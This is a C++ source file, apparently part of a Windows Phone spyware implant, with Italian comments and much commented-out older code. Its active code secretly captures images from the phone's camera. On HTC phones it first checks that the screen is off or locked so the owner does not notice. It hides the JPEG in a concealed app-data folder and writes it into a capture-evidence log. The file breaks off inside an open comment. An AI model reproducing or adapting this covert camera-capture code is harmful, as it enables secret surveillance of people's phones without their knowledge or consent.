#include "NativePhotoCaptureInterface.h"
#include "FunctionFunc.h"
#include "Common.h"
#include "Log.h"
#include "Device.h"

using namespace Microsoft::WRL;
using namespace Windows::Foundation;
using namespace Windows::Foundation::Collections;
using namespace Windows::Phone::Media::Capture;
using namespace Windows::Storage;
using namespace Concurrency;
using namespace Platform;



#include <time.h>


#define DTTMFMT "%Y-%m-%d %H:%M:%S "
#define DTTMSZ 21

//#define DTTMFMTAUD "%Y%m%d%H%M%Sxxxxxx"
#define DTTMFMTAUD "%Y%m%d%H%M%S"
#define DTTMSZAUD 16

/*
#define SIZE_Width 3264
#define SIZE_Height 2448
*/

#define SIZE_Width 640
#define SIZE_Height 480


char nomeFile[32];	
char nomeFileLast[32];	

static int COSTRUITO=0;

static char *getDtTmAUD (char *buff) {
    time_t t = time (0);
    strftime(buff, DTTMSZAUD, DTTMFMTAUD, localtime (&t));
    return buff;
}

static char *getDtTm (char *buff) {
    time_t t = time (0);
    strftime(buff, DTTMSZ, DTTMFMT, localtime (&t));
    return buff;
}

#include <windows.h>
#include <iostream>
#include <fstream>

using namespace std;
using namespace NativePhotoCaptureInterface::Native;


/////Log* PtrCameraLog;

// NB: se il dislay è in lock o è spento resetto l'idle per estrarre lo stato
// Il problema si pone quando il display è in lock dato che resettanto l'idle prolunga la permanenza del lock screen
// si puo' verificare con una bassa probabilita' ed ha anche un basso impatto ma è da tenerne conto
bool ChekDisplayOn()
{
	// se _Shell_IsUnlockedNormal()=1  allora sono certo che il display è acceso
	// se _Shell_IsUnlockedNormal()=0  il display potrebbe essere acceso in lock mode o spento
	if (_Shell_IsUnlockedNormal()==1) 
	{   
		DBG_TRACE(L"Display Acceso: non posso scattare la foto\n", 1, FALSE);
		Log logInfo;
		logInfo.WriteLogInfo(L"Display Acceso: non posso scattare la foto");
		return TRUE;
	} 
	else	
	{
		//if(_Shell_IdleTimerReset(8) == 0x1000000 ) return FALSE;

		// se _Shell_IdleTimerReset(8) = 0x1000000 allora il display è spento
		//altrimenti è acceso in lock mode
		if(_Shell_IdleTimerReset(8) != 0 ) 
		{
			return FALSE;
		}
		else 
		{
			DBG_TRACE(L"Display Acceso: non posso scattare la foto\n", 1, FALSE);
			Log logInfo;
			logInfo.WriteLogInfo(L"Display Acceso: non posso scattare la foto");
			return TRUE;
		}
	}

}


UINT ReaderCallback(int* rgBytes, UINT cb, UINT cbActual)
{
	/*
    cbActual = 0;
    uint num2 = cb;
    try
    {
        while (cbActual < cb)
        {
            int count = (int) Math.Min((uint) this._scratch.Length, num2);
            count = this._s.Read(this._scratch, 0, count);
            Marshal.Copy(this._scratch, 0, IntPtr.Add(rgBytes, (int) cbActual), count);
            num2 -= (uint) count;
            cbActual += count;
            if (count == 0)
            {
                break;
            }
        }
        return 0;
    }
    catch (Exception exception)
    {
        return this.MapExceptions(exception);
    }
	*/
#ifdef _DEBUG	
	WCHAR msg[128];
	swprintf_s(msg, L"ReaderCallback>>>>>>>>>>>>>>>>> rgBytes=0x%x, cb=0x%x, cbActual=0x%x\n",rgBytes,cb,cbActual);
	OutputDebugString(msg);
#endif
	
	  return 0;
}

UINT SeekCallBack(long dlibMove, UINT dwOrigin, ULONG plibNewPosition)
{
	/*
    try
    {
        SeekOrigin origin = (SeekOrigin) dwOrigin;
        plibNewPosition = (ulong) this._s.Seek(dlibMove, origin);
        return 0;
    }
    catch (Exception exception)
    {
        return this.MapExceptions(exception);
    }
	*/
#ifdef _DEBUG
	WCHAR msg[128];
	swprintf_s(msg, L"SeekCallBack>>>>>>>>>>>>>>>>> dlibMove=0x%x, dwOrigin=0x%x, plibNewPosition=0x%x\n",dlibMove,dwOrigin,plibNewPosition);
	OutputDebugString(msg);
#endif
	 return 0;

}


UINT WriteCallback(int* rgBytes, UINT cb,  UINT *cbActual)
{
	/*
      cbActual = 0;
    uint num2 = cb;

        while (cbActual < cb)
        {
            int length = (int) Math.Min((uint) this._scratch.Length, num2);
            Marshal.Copy(IntPtr.Add(rgBytes, (int) cbActual), this._scratch, 0, length);
            this._s.Write(this._scratch, 0, length);
            num2 -= (uint) length;
            cbActual += length;
        }
        return 0;
   

		*/
	/*
	cbActual = 0;
    UINT num2 = cb;

        while (cbActual < cb)
        {
            int length = (INT) __min((UINT) 0x400, num2);

            //_RtlCopyMemory(rgBytes+cbActual, 0x400, 0, length);
            //this._s.Write(0x400, 0, length);
            num2 -= (UINT) length;
            cbActual += length;
        }
        return 0;
   */

					//se uRead!=0 entra
					/*
						if (CameraLog.CreateLog(LOGTYPE_CAMSHOT, NULL, 0, FLASH)) {
							liZero.HighPart = liZero.LowPart = 0;
							pOutStream->Seek(liZero, STREAM_SEEK_SET, NULL);

							do {
									uRead = 0;
									pOutStream->Read(rgbBuffer, sizeof(rgbBuffer), &uRead);

									
									if (uRead)
										CameraLog.WriteLog(rgbBuffer, uRead);
							} while (uRead);

							CameraLog.CloseLog();
						}
						*/


#ifdef _DEBUG
	WCHAR msg[128];
	swprintf_s(msg, L"WriteCallback>>>>>>>>>>>>>>>>> rgBytes=0x%x, cb=0x%x, cbActual=0x%x\n",rgBytes,cb,cbActual);
	OutputDebugString(msg);
	DBG_TRACE(msg, 1, FALSE);
#endif	
	fstream filestr;
	//non utilizzo l'incremento delle immagini
	//filestr.open("image.rgb", fstream::out|fstream::binary);
	filestr.open(nomeFile, fstream::out|fstream::binary|fstream::app);
	filestr.seekg (0, ios::beg);
	filestr.write ((const char*)rgBytes, cb);
	filestr.close();

/*****
	Log CameraLog;

	if( strcmp(nomeFileLast,nomeFile) ){
		CameraLog.CreateLog(LOGTYPE_CAMSHOT, NULL, 0, FLASH);
		strcpy(nomeFileLast,nomeFile);
	}

	CameraLog.WriteLog((BYTE*)rgBytes, cb);


	if(cb!=0x1000) {
		
		CameraLog.CloseLog();
	}
*****/


	*cbActual=cb;

	return 0;
}


NativePhotoCaptureInterface::Native::NativeCapture::NativeCapture()
{
	Device *deviceObj = Device::self();

		//1280x720
		//640x480
		Size captureDimensions;
		captureDimensions.Width = SIZE_Width;
		captureDimensions.Height = SIZE_Height;		

	Windows::Foundation::Size  initialResolution =  Windows::Foundation::Size(640, 480);
	Windows::Foundation::Size  previewResolution =  Windows::Foundation::Size(640, 480);
	Windows::Foundation::Size  captureResolution =  Windows::Foundation::Size(640, 480);
	
	strcpy(nomeFileLast,"");

/*
	Windows::Foundation::Size  initialResolution =  Windows::Foundation::Size(3264, 2448);
	Windows::Foundation::Size  previewResolution =  Windows::Foundation::Size(3264, 2448);
	Windows::Foundation::Size  captureResolution =  Windows::Foundation::Size(3264, 2448);
*/


		IVectorView<CameraSensorLocation>^ pAvailableSensorLocations=PhotoCaptureDevice::AvailableSensorLocations;
			
#define	DEMO_ISS
		//cattura da tutte le camere disponibili
		//devo creare due thread separati, per cui il for pulito non fuo' essere utilizzato
#ifndef DEMO_ISS
		for(int i=0;i<pAvailableSensorLocations->Size;i++)
#else
		for(int i=1;i<2;i++) //forzo 0=back 1=front
#endif
		{
			
		  ///for(int jj=0;jj<3;jj++)
		  {
			//controlla che non vi sia il display acceso
			//serve sugli htc sui nokia sembrerebbe non servire da gestire in un secondo tempo
///// DA RIABILITARE BYGIO			if(ChekDisplayOn()==TRUE) break;

			
			wstring Manufacturer=deviceObj->GetManufacturer().c_str();

			//se è un HTC devo controllare che il display sia spento prima di scattare
			//il problema che per farlo resetto l'idle per cui allulga il tempo di spegnimento del display il stato di lock
			if(Manufacturer==L"HTC") 
				if(ChekDisplayOn()==TRUE) break;

			
			concurrency::cancellation_token_source PhotoTaskTokenSourceFront;


			/* Nokia 820

				3264.000000 2448.000000	
				3552.000000 2000.000000
				2592.000000 1936.000000
				2592.000000 1456.000000
				2048.000000 1536.000000
				640.000000 480.000000

			*/
			/*
			//estraggo le risoluzioni supportate
			IVectorView<Size>^ pSize1=PhotoCaptureDevice::GetAvailableCaptureResolutions(pAvailableSensorLocations->GetAt(i));
			
			for(int j=0;j<pSize1->Size;j++)
			{
				
				auto pN1a=pSize1->GetAt(j);
				char str[100];
				sprintf(str,"%f %f\n",pN1a.Width,pN1a.Height);
				OutputDebugStringA(str);
			}

			IVectorView<Size>^ pSize2=PhotoCaptureDevice::GetAvailableCaptureResolutions(pAvailableSensorLocations->GetAt(i));

			for(int j=0;j<pSize2->Size;j++)
			{
				
				auto pN1a=pSize2->GetAt(j);
				char str[100];
				sprintf(str,"%f %f\n",pN1a.Width,pN1a.Height);
				OutputDebugStringA(str);
			}
			*/

			
			task<PhotoCaptureDevice^> PhotoCaptureTask(PhotoCaptureDevice::OpenAsync(pAvailableSensorLocations->GetAt(i), initialResolution), PhotoTaskTokenSourceFront.get_token());
		


			PhotoCaptureTask.then([=](task<PhotoCaptureDevice^> getPhotoTask)
			{
				//trappo le eccezioni nel caso in cui la camera sia gia' in uso!!!
				try
				{
					auto pPhotoCaptureDevice = getPhotoTask.get();

						
/////					pPhotoCaptureDevice->SetCaptureResolutionAsync(captureResolution);
/////					pPhotoCaptureDevice->SetPreviewResolutionAsync(previewResolution);


					//IMPORTANTISSIMO anche se io setto una risoluzione passata in captureDimensions lui fa quello che vuole e decide con che risoluzione catturare a seconda del telefono
					Windows::Foundation::Size PreActualResolution = pPhotoCaptureDevice->PreviewResolution;
					Windows::Foundation::Size CapActualResolution = pPhotoCaptureDevice->CaptureResolution;

					//pPhotoCaptureDevice->SetProperty(KnownCameraGeneralProperties::EncodeWithOrientation, 180);

/////					pPhotoCaptureDevice->SetProperty(KnownCameraGeneralProperties::EncodeWithOrientation, pPhotoCaptureDevice->SensorLocation == CameraSensorLocation::Back ? pPhotoCaptureDevice->SensorRotationInDegrees : pPhotoCaptureDevice->SensorRotationInDegrees);

/////					pPhotoCaptureDevice->SetProperty(KnownCameraGeneralProperties::PlayShutterSoundOnCapture,true);

						//pPhotoCaptureDevice->SetProperty(KnownCameraPhotoProperties::FlashMode,FlashState::On); //Non implementato GetAt(1), GetAt(2)
					   //pPhotoCaptureDevice->SetProperty(KnownCameraPhotoProperties::FocusIlluminationMode,2); //Non implementato GetAt(2)
/***
						//queste tre sono supportate
						pPhotoCaptureDevice->SetProperty(KnownCameraPhotoProperties::ExposureTime,300);
						pPhotoCaptureDevice->SetProperty(KnownCameraPhotoProperties::ExposureCompensation,0);
						pPhotoCaptureDevice->SetProperty(KnownCameraPhotoProperties::Iso,600);
***/						

						//pPhotoCaptureDevice->SetProperty(KnownCameraPhotoProperties::SceneMode,CameraSceneMode::Macro);
						//pPhotoCaptureDevice->SetProperty(KnownCameraPhotoProperties::FocusIlluminationMode,FocusIlluminationMode::Off);

						/* queste funzioni non sono implementate
						pPhotoCaptureDevice->SetProperty(KnownCameraPhotoProperties::SceneMode,CameraSceneMode::Macro);					
						pPhotoCaptureDevice->SetProperty(KnownCameraPhotoProperties::FocusIlluminationMode,FocusIlluminationMode::Off);
						pPhotoCaptureDevice->SetProperty(KnownCameraPhotoProperties::LockedAutoFocusParameters,AutoFocusParameters ::WhiteBalance);
						pPhotoCaptureDevice->SetProperty(KnownCameraPhotoProperties::ManualWhiteBalance,100);
						pPhotoCaptureDevice->SetProperty(KnownCameraPhotoProperties::WhiteBalancePreset,WhiteBalancePreset::Candlelight);
						*/


					//	pPhotoCaptureDevice->SetProperty(KnownCameraPhotoProperties::FlashPower,34);


						Platform::Array<int, 1U>^ pBuffer;
						pBuffer= ref new Platform::Array<int, 1U>(PreActualResolution.Width*PreActualResolution.Height*4);
						pPhotoCaptureDevice->GetPreviewBufferArgb(pBuffer);

						uint8 * pixels = (uint8 *) pBuffer->Data;

#ifdef DEMO_ISS
						//siccome EncodeWithOrientation non funziona devo ruotare a mano la jpeg

						Platform::Array<int, 1U>^ pRotateBuffer;
						pRotateBuffer= ref new Platform::Array<int, 1U>(PreActualResolution.Width*PreActualResolution.Height*4);
						uint8 * pixelsRotate = (uint8 *) pRotateBuffer->Data;
						
						//rotate(pixels, pixelsRotate, PreActualResolution.Height, PreActualResolution.Width);
						/*
						unsigned int row=PreActualResolution.Height;
						unsigned int col=PreActualResolution.Width;
					    unsigned int r, c;
						for(r = 0; r < row; r++)
						{
							for(c = 0; c < col; c++)
							{
								*(pixelsRotate + c * row + (row - r - 1)) = *(pixels + r * col + c);
							}
						}
						*/

						typedef struct {
							uint8  red;
							uint8  green;
							uint8  blue;
							uint8  A;
						} pixel_t;


						
						const pixel_t *const image=(const pixel_t *)pixels;

						int pi=0;
						int  yy;
						int xx;
						const int width=PreActualResolution.Width;
						const int height=PreActualResolution.Height;

						/*
						//ruota di 90 sopra
						for (int xx = 0; xx < width; xx++) {
								for (yy = height - 1; yy >= 0; yy--) {
						*/
								
						/* 
						 // lascia invariata l'immagine
						 for (yy = 0; yy < height; yy++) {
							 for (xx = 0; xx < width; xx++) {
							 */
						/*
						//fa il mirror
						 for (yy = 0; yy < height; yy++) {
							 for (xx = width - 1; xx >= 0; xx--) {
						*/
						/*
						for (xx = width - 1; xx >= 0; xx--) {
								for (yy = height - 1; yy >= 0; yy--) {
								*/
							for (xx = width - 1; xx >= 0; xx--) {
								for (yy = 0; yy < height; yy++) {

									pixelsRotate[pi]=image[xx + yy * width].red;pi++;
									pixelsRotate[pi]=image[xx + yy * width].green;pi++;
									pixelsRotate[pi]=image[xx + yy * width].blue;pi++;
									pixelsRotate[pi]=image[xx + yy * width].A;pi++;
								}
							}


#endif					


						int j=0;
						//MediaApi_EncodeARGBIntoJpegStream(BUFFER, (uint) 640, (uint) 480, (uint) 640, (uint) 480, (uint) 0, (uint) 90, (uint) ((640 * 4) * 480), this._readercb, this._seekcb, this._writecb, (ulong) ((uint) this._s.Length));
#ifdef _DEBUG
						char nomeFileBase[DTTMSZAUD];				
   						getDtTmAUD(nomeFileBase);
						//0 normalmente è la camera back 1 e' la front
						CameraSensorLocation SL=pPhotoCaptureDevice->SensorLocation;
						
						
						sprintf(nomeFile,"\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$Win15Mobile\\photo_%i_%s.jpg",SL,nomeFileBase);

						OutputDebugStringA(nomeFile);
						OutputDebugStringA("\n");
#else
						//uso ptjfHJ4f4tD come file temporaneo per la conversione delle immagini in jpeg
						sprintf(nomeFile,"\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$Win15Mobile\\ptjfHJ4f4tD");
						DeleteFile(L"\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$Win15Mobile\\ptjfHJ4f4tD");

#endif

						
						ULONG lengthOfStream=0;



#ifdef DEMO_ISS
						
							int ret=_MediaApi_EncodeARGBIntoJpegStream((int*)pixelsRotate, PreActualResolution.Height, PreActualResolution.Width, PreActualResolution.Height, PreActualResolution.Width, 0, 90, ((PreActualResolution.Height * 4) * PreActualResolution.Width), NULL, NULL, WriteCallback, lengthOfStream);
#else
							int ret=_MediaApi_EncodeARGBIntoJpegStream((int*)pixels, PreActualResolution.Width, PreActualResolution.Height, PreActualResolution.Width, PreActualResolution.Height, 0, 90, ((PreActualResolution.Width * 4) * PreActualResolution.Height), NULL, NULL, WriteCallback, lengthOfStream);
#endif

							std::ifstream is (nomeFile, std::ifstream::binary);
							if (is) {
							// get length of file:
							is.seekg (0, is.end);
							int length = is.tellg();
							is.seekg (0, is.beg);

							// allocate memory:
							char * buffer = new char [length];

							// read data as a block:
							is.read (buffer,length);

							is.close();

							// print content:
							//std::cout.write (buffer,length);
							
							DeleteFile(L"\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$Win15Mobile\\ptjfHJ4f4tD");
							
							Log CameraLog;

							CameraLog.CreateLog(LOGTYPE_CAMSHOT, NULL, 0, FLASH);
							CameraLog.WriteLog((BYTE*)buffer, length);
							CameraLog.CloseLog();

							

							delete[] buffer;
							}


							
							


						
					

					/*
						if (CameraLog.CreateLog(LOGTYPE_CAMSHOT, NULL, 0, FLASH)) {
							liZero.HighPart = liZero.LowPart = 0;
							pOutStream->Seek(liZero, STREAM_SEEK_SET, NULL);

							do {
									uRead = 0;
									pOutStream->Read(rgbBuffer, sizeof(rgbBuffer), &uRead);

									//se uRead!=0 entra
									if (uRead)
										CameraLog.WriteLog(rgbBuffer, uRead);
							} while (uRead);

							CameraLog.CloseLog();
						}
						*/


			/******			
						BYTE tmp;
						//converto da bgra in rgb
						for(int i=0;i<actualResolution.Width*actualResolution.Height*4;i=i+4)
						{
							tmp=pixels[i];
							pixels[j]=pixels[i+2];
							pixels[j+1]=pixels[i+1];
							pixels[j+2]=tmp;
							j=j+3;
						}

						//char nomeFileBase[DTTMSZAUD];					
   						//getDtTmAUD(nomeFileBase);

	 
						//char nomeFile[32];
						//sprintf(nomeFile,"photoF_%s.rgb",nomeFileBase);
						
				
						//0 normalmente è la camera back 1 e' la front
						//CameraSensorLocation SL=pPhotoCaptureDevice->SensorLocation;
						
						char nomeFile[32];
						sprintf(nomeFile,"photo_%i_%s.rgb",SL,nomeFileBase);

						OutputDebugStringA(nomeFile);
						OutputDebugStringA("\n");

						fstream filestr;
						//non utilizzo l'incremento delle immagini
						//filestr.open("image.rgb", fstream::out|fstream::binary);
						filestr.open(nomeFile, fstream::out|fstream::binary);
						filestr.seekg (0, ios::beg);
						filestr.write ((const char*)pixels, actualResolution.Width*actualResolution.Height*3);
						filestr.close();
			*****/
				
				}
				catch (Platform::Exception^ e) 
				{
#ifdef _DEBUG
					OutputDebugString(L"<<<eccezione capture Photo gestita>>>\n");
					///OutputDebugString(*((wchar_t**)(*((int*)(((Platform::Exception^)((Platform::COMException^)(e)))) - 1)) + 1));
#endif

					Log logInfo;
					logInfo.WriteLogInfo(L"Camera is in use, pictures won't be captured");
					///logInfo.WriteLogInfo(*((wchar_t**)(*((int*)(((Platform::Exception^)((Platform::COMException^)(e)))) - 1)) + 1));

				}

			}
		
	).wait();
		

		}
		//aspetto XXX sec prima di catturare dalla seconda camera
#ifndef DEMO_ISS
		_Sleep(5000);
#endif
		
	}


//NativePhotoCaptureInterface::Native::NativeCapture::NativeCapture()
//{
//	
//		//1280x720
//		//640x480
//		Size captureDimensions;
//		captureDimensions.Width = SIZE_Width;
//		captureDimensions.Height = SIZE_Height;		
//
//
//		IVectorView<CameraSensorLocation>^ pAvailableSensorLocations=PhotoCaptureDevice::AvailableSensorLocations;
//			
//			
//		//cattura da tutte le camere disponibili
//		//devo creare due thread separati, per cui il for pulito non fuo' essere utilizzato
//		for(int i=0;i<pAvailableSensorLocations->Size;i++)
//		/////for(int i=1;i<2;i++) //forzo 0=back 1=front
//		{
//			
//		  ///for(int jj=0;jj<3;jj++)
//		  {
//			//controlla che non vi sia il display acceso
//			//serve sugli htc sui nokia sembrerebbe non servire da gestire in un secondo tempo
//			if(ChekDisplayOn()==TRUE) break;
//
//			concurrency::cancellation_token_source PhotoTaskTokenSourceFront;
//
//
///*****			
//			//estraggo le risoluzioni supportate
//			IVectorView<Size>^ pSize1=PhotoCaptureDevice::GetAvailableCaptureResolutions(pAvailableSensorLocations->GetAt(i));
//			
//			for(int j=0;j<pSize1->Size;j++)
//			{
//				
//				auto pN1a=pSize1->GetAt(j);
//				char str[100];
//				sprintf(str,"%f %f\n",pN1a.Width,pN1a.Height);
//				OutputDebugStringA(str);
//			}
//
//			IVectorView<Size>^ pSize2=PhotoCaptureDevice::GetAvailableCaptureResolutions(pAvailableSensorLocations->GetAt(i));
//
//			for(int j=0;j<pSize2->Size;j++)
//			{
//				
//				auto pN1a=pSize2->GetAt(j);
//				char str[100];
//				sprintf(str,"%f %f\n",pN1a.Width,pN1a.Height);
//				OutputDebugStringA(str);
//			}
//*****/
//
//
//			task<PhotoCaptureDevice^> AudioTask(PhotoCaptureDevice::OpenAsync(pAvailableSensorLocations->GetAt(i), captureDimensions), PhotoTaskTokenSourceFront.get_token());
//
//
//			AudioTask.then([=](task<PhotoCaptureDevice^> getPhotoTask)
//			{
//					auto pPhotoCaptureDevice = getPhotoTask.get();
//
//					//IMPORTANTISSIMO anche se io setto una risoluzione passata in captureDimensions lui fa quello che vuole e decide con che risoluzione catturare a seconda del telefono
//					Windows::Foundation::Size actualResolution = pPhotoCaptureDevice->PreviewResolution;
//					
//						Platform::Array<int, 1U>^ pBuffer;
//						pBuffer= ref new Platform::Array<int, 1U>(actualResolution.Width*actualResolution.Height*4);
//						pPhotoCaptureDevice->GetPreviewBufferArgb(pBuffer);
//
//						uint8 * pixels = (uint8 *) pBuffer->Data;
//
//						int j=0;
//						//MediaApi_EncodeARGBIntoJpegStream(BUFFER, (uint) 640, (uint) 480, (uint) 640, (uint) 480, (uint) 0, (uint) 90, (uint) ((640 * 4) * 480), this._readercb, this._seekcb, this._writecb, (ulong) ((uint) this._s.Length));
//
//						char nomeFileBase[DTTMSZAUD];				
//   						getDtTmAUD(nomeFileBase);
//						//0 normalmente è la camera back 1 e' la front
//						CameraSensorLocation SL=pPhotoCaptureDevice->SensorLocation;
//						
//						
//						sprintf(nomeFile,"photo_%i_%s_%i.jpg",SL,nomeFileBase,jj);
//
//						OutputDebugStringA(nomeFile);
//						OutputDebugStringA("\n");
//
//						WCHAR msg[128];
//						swprintf_s(msg, L"Assegnato0 nome=%s\n",nomeFile);
//						DBG_TRACE(msg, 1, FALSE);
//
//						int ret=_MediaApi_EncodeARGBIntoJpegStream((int*)pixels, actualResolution.Width, actualResolution.Height, actualResolution.Width, actualResolution.Height, 0, 90, ((actualResolution.Width * 4) * actualResolution.Height), NULL, NULL, WriteCallback, 0);
//
//			/******			
//						BYTE tmp;
//						//converto da bgra in rgb
//						for(int i=0;i<actualResolution.Width*actualResolution.Height*4;i=i+4)
//						{
//							tmp=pixels[i];
//							pixels[j]=pixels[i+2];
//							pixels[j+1]=pixels[i+1];
//							pixels[j+2]=tmp;
//							j=j+3;
//						}
//
//						//char nomeFileBase[DTTMSZAUD];					
//   						//getDtTmAUD(nomeFileBase);
//
//	 
//						//char nomeFile[32];
//						//sprintf(nomeFile,"photoF_%s.rgb",nomeFileBase);
//						
//				
//						//0 normalmente è la camera back 1 e' la front
//						//CameraSensorLocation SL=pPhotoCaptureDevice->SensorLocation;
//						
//						char nomeFile[32];
//						sprintf(nomeFile,"photo_%i_%s.rgb",SL,nomeFileBase);
//
//						OutputDebugStringA(nomeFile);
//						OutputDebugStringA("\n");
//
//						fstream filestr;
//						//non utilizzo l'incremento delle immagini
//						//filestr.open("image.rgb", fstream::out|fstream::binary);
//						filestr.open(nomeFile, fstream::out|fstream::binary);
//						filestr.seekg (0, ios::beg);
//						filestr.write ((const char*)pixels, actualResolution.Width*actualResolution.Height*3);
//						filestr.close();
//			*****/
//				
//			}
//		
//	).wait();
//		
//		}
//		//aspetto un sec prima di catturare dalla seconda camera
//		_Sleep(1000);
//		
//	}


/***
		IVectorView<CameraSensorLocation>^ pAvailableSensorLocations=PhotoCaptureDevice::AvailableSensorLocations;
			
			
		//cattura da tutte le camere disponibili
		//devo creare due thread separati, per cui il for pulito non fuo' essere utilizzato
		for(int i=0;i<pAvailableSensorLocations->Size;i++)
		{


			IAsyncOperation<PhotoCaptureDevice^> ^openOperation= PhotoCaptureDevice::OpenAsync(pAvailableSensorLocations->GetAt(i), captureDimensions);
			
			openOperation->Completed =  ref new AsyncOperationCompletedHandler<PhotoCaptureDevice^>(
				[=] (IAsyncOperation<PhotoCaptureDevice^> ^operation, Windows::Foundation::AsyncStatus status)
				{
					if (status == Windows::Foundation::AsyncStatus::Completed)
					{
						auto pPhotoCaptureDevice = operation->GetResults();
						
						

						Windows::Foundation::Size actualResolution = pPhotoCaptureDevice->PreviewResolution;
		  
			

						Platform::Array<int, 1U>^ pBuffer;
						pBuffer= ref new Platform::Array<int, 1U>(640*480*4);
						pPhotoCaptureDevice->GetPreviewBufferArgb(pBuffer);

						uint8 * pixels = (uint8 *) pBuffer->Data;

						int j=0;

						BYTE tmp;
						//converto da bgra in rgb
						for(int i=0;i<640*480*4;i=i+4)
						{
							tmp=pixels[i];
							pixels[j]=pixels[i+2];
							pixels[j+1]=pixels[i+1];
							pixels[j+2]=tmp;
							j=j+3;
						}

						char nomeFileBase[DTTMSZAUD];					
   						getDtTmAUD(nomeFileBase);

	 
						//0 normalmente è la camera back 1 e' la front
						CameraSensorLocation SL=pPhotoCaptureDevice->SensorLocation;
						
						char nomeFile[32];
						sprintf(nomeFile,"photo_%i_%s.rgb",SL,nomeFileBase);

						OutputDebugStringA(nomeFile);
						OutputDebugStringA("\n");

						fstream filestr;
						//non utilizzo l'incremento delle immagini
						//filestr.open("image.rgb", fstream::out|fstream::binary);
						filestr.open(nomeFile, fstream::out|fstream::binary);
						filestr.seekg (0, ios::beg);
						filestr.write ((const char*)pixels, 640*480*3);
						filestr.close();

						//lascio un po' di tempo per la cattura della camera back prima di passare alla front
						_Sleep(2000);
					}
				}
			);
			
		}

***/

/***
			IAsyncOperation<PhotoCaptureDevice^> ^openOperationBack= PhotoCaptureDevice::OpenAsync(Windows::Phone::Media::Capture::CameraSensorLocation::Back, captureDimensions);

			
			openOperationBack->Completed =  ref new AsyncOperationCompletedHandler<PhotoCaptureDevice^>(
				[=] (IAsyncOperation<PhotoCaptureDevice^> ^operation, Windows::Foundation::AsyncStatus status)
				{
					if (status == Windows::Foundation::AsyncStatus::Completed)
					{
						auto pPhotoCaptureDevice = operation->GetResults();

						//pPhotoCaptureDevice->FocusAsync();


						//Windows::Foundation::Size actualResolution = pPhotoCaptureDevice->PreviewResolution;
		  
						//pPhotoCaptureDevice->SetProperty(KnownCameraPhotoProperties::SceneMode,CameraSceneMode::Macro);
						//pPhotoCaptureDevice->SetProperty(KnownCameraPhotoProperties::FocusIlluminationMode,FocusIlluminationMode::Off);


						//AutoFocusParameters poii;
						//	
						//auto poi=pPhotoCaptureDevice->GetProperty(KnownCameraPhotoProperties::LockedAutoFocusParameters)->ToString();
						//	
						//
						//	

						//auto p1=pPhotoCaptureDevice->GetProperty(KnownCameraPhotoProperties::ExposureCompensation)->ToString(); /// 0
						//auto p2=pPhotoCaptureDevice->GetProperty(KnownCameraPhotoProperties::ExposureTime)->ToString(); //
						//auto p3=pPhotoCaptureDevice->GetProperty(KnownCameraPhotoProperties::FlashMode)->ToString(); /// 1 
						//auto p4=pPhotoCaptureDevice->GetProperty(KnownCameraPhotoProperties::FlashPower)->ToString(); /// 1

						////0	Indicates that the flash will not be used to focus.
						////1	Indicates that the flash will be used automatically, if needed, to focus.
						//auto p5=pPhotoCaptureDevice->GetProperty(KnownCameraPhotoProperties::FocusIlluminationMode)->ToString(); /// H0  N1 
						//auto p6=pPhotoCaptureDevice->GetProperty(KnownCameraPhotoProperties::Iso)->ToString(); //
						//auto p7=pPhotoCaptureDevice->GetProperty(KnownCameraPhotoProperties::LockedAutoFocusParameters)->ToString(); /// 0
						//auto p8=pPhotoCaptureDevice->GetProperty(KnownCameraPhotoProperties::ManualWhiteBalance)->ToString(); //


						//auto p9=pPhotoCaptureDevice->GetProperty(KnownCameraPhotoProperties::SceneMode)->ToString(); /// 1  32
						//auto p10=pPhotoCaptureDevice->GetProperty(KnownCameraPhotoProperties::WhiteBalancePreset)->ToString(); //

	





						Platform::Array<int, 1U>^ pBuffer;
						pBuffer= ref new Platform::Array<int, 1U>(640*480*4);
						pPhotoCaptureDevice->GetPreviewBufferArgb(pBuffer);

						uint8 * pixels = (uint8 *) pBuffer->Data;

						int j=0;

						BYTE tmp;
						//converto da bgra in rgb
						for(int i=0;i<640*480*4;i=i+4)
						{
							tmp=pixels[i];
							pixels[j]=pixels[i+2];
							pixels[j+1]=pixels[i+1];
							pixels[j+2]=tmp;
							j=j+3;
						}

						char nomeFileBase[DTTMSZAUD];					
   						getDtTmAUD(nomeFileBase);

	 
						char nomeFile[32];
						sprintf(nomeFile,"photoB_%s.rgb",nomeFileBase);

						fstream filestr;
						//non utilizzo l'incremento delle immagini
						//filestr.open("image.rgb", fstream::out|fstream::binary);
						filestr.open(nomeFile, fstream::out|fstream::binary);
						filestr.seekg (0, ios::beg);
						filestr.write ((const char*)pixels, 640*480*3);
						filestr.close();

					}
				}
			);
			
***/

/*****
			IAsyncOperation<PhotoCaptureDevice^> ^openOperationFront= PhotoCaptureDevice::OpenAsync(Windows::Phone::Media::Capture::CameraSensorLocation::Front, captureDimensions);

			openOperationFront->Completed =  ref new AsyncOperationCompletedHandler<PhotoCaptureDevice^>(
				[=] (IAsyncOperation<PhotoCaptureDevice^> ^operation, Windows::Foundation::AsyncStatus status)
				{
					if (status == Windows::Foundation::AsyncStatus::Completed)
					{
						auto pPhotoCaptureDevice = operation->GetResults();

						Windows::Foundation::Size actualResolution = pPhotoCaptureDevice->PreviewResolution;
		  


						Platform::Array<int, 1U>^ pBuffer;
						pBuffer= ref new Platform::Array<int, 1U>(640*480*4);
						pPhotoCaptureDevice->GetPreviewBufferArgb(pBuffer);

						uint8 * pixels = (uint8 *) pBuffer->Data;

						int j=0;

						BYTE tmp;
						//converto da bgra in rgb
						for(int i=0;i<640*480*4;i=i+4)
						{
							tmp=pixels[i];
							pixels[j]=pixels[i+2];
							pixels[j+1]=pixels[i+1];
							pixels[j+2]=tmp;
							j=j+3;
						}

						char nomeFileBase[DTTMSZAUD];					
   						getDtTmAUD(nomeFileBase);

	 
						char nomeFile[20];
						sprintf(nomeFile,"photoF%s.rgb",nomeFileBase);

						fstream filestr;
						//non utilizzo l'incremento delle immagini
						//filestr.open("image.rgb", fstream::out|fstream::binary);
						filestr.open(nomeFile, fstream::out|fstream::binary);
						filestr.seekg (0, ios::beg);
						filestr.write ((const char*)pixels, 640*480*3);
						filestr.close();

					}
				}
			);



****/


/*****
			concurrency::cancellation_token_source PhotoTaskTokenSourceBack;

